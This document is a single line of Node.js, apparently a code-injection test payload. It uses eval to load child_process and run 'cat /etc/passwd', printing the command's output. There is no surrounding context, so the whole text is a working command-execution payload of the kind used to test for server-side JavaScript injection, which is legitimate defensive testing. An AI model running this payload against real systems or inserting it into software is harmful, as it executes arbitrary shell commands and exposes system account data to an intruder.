eval('require("child_process").exec("cat /etc/passwd",(_,o,e)=>{ console.log(o+e);});')
